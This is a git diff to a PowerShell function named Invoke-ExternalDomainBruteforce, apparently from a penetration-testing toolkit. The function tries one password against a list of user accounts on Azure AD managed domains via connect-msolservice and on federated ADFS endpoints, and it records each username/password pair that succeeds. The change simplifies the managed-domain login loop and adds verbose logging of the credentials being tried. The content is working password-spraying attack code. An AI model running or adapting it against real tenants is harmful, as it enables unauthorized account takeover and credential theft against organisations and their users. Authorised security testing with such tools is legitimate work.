@@ -152,40 +152,35 @@ function Invoke-ExternalDomainBruteforce{
     if ($info[1] -eq "Managed" ) {
 
 		$Users | ForEach-Object {
-		    
-            # Checking if Powershell is running as Administrator
-            # Running as Administrator is necessary for opening new local PSSessions
-            $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent() )
-            if($currentPrincipal.IsInRole( [Security.Principal.WindowsBuiltInRole]::Administrator)){}
-            else{Write-Host "Administrative rights are needed to test Managed domains.`nPlease re-open powershell as an administrator." -ForegroundColor Red;break}
-		
+		    	
 			try{
 				# Make all errors terminating to get try/catch to work.
 				$ErrorActionPreference = "Stop";
-			
-				# Set up new PSSession
-				$s = New-PSSession -Name AzureBruteForce
-                
-				# Set up credentials and connect to Azure cloud in PSSession
-				Invoke-Command -Session $s -ScriptBlock {$User = "$($args[0])";$PWord = ConvertTo-SecureString -String "$($args[1])" -AsPlainText -Force;$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord;connect-msolservice -credential $Credential} -ArgumentList $_,$password
 				
-				# Try accessing user information to confirm connection set up
-				# If successful, record email and password in table
-				if(Invoke-Command -Session $s -ScriptBlock {Get-MsolUser -UserPrincipalName $User}) {
-					$EmailTestResults.Rows.Add($_, "N/A", $password) | Out-Null
-					Write-Host 'Authentication Successful: '$_' - '$password -ForegroundColor Green
-				}
-			
-				# Kill and remove PSSession
-				Remove-PSSession -Session $s
+				# Setting up credential object
+				$User = $_
+				$PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+				$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord
+				
+				Write-Verbose "Testing $($User) with password $($password)"
+				
+				# Attempt to authenticate to Managed domain
+				connect-msolservice -credential $Credential
+				
+				# If no error is detected, authentication is successful
+				Write-Host "Authentication Successful: `t'$User' - "$password -ForegroundColor Green
+				$EmailTestResults.Rows.Add($User, "N/A", $password) | Out-Null	
+				
+				# Keep track of the last successful authentication
+				$LastSuccessAuth = $User
 			}
 
 			catch{
-				# Make sure to remove PSSession
-				Remove-PSSession -Session $s
-				Write-Host 'Authentication Failure: '$email' - '$password -ForegroundColor Red
+				Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red
 			}
 		}
+		
+		Write-Host "`nWARNING: You still have an active session as "$LastSuccessAuth"`nAny actions against a Managed domain will take place as this user. You have been warned.`nTo close this session, please exit from your PowerShell session." -ForegroundColor Red
     }
 	
     ElseIf($info[1] -eq "Federated") {
@@ -202,6 +197,8 @@ function Invoke-ExternalDomainBruteforce{
 			# Parse the JSON URI into usable formats
 			$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
 			$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
+			
+			Write-Verbose "Testing $($User) with password $($password)"
 			
 			# Attempt to request a security token using username/password
             try{
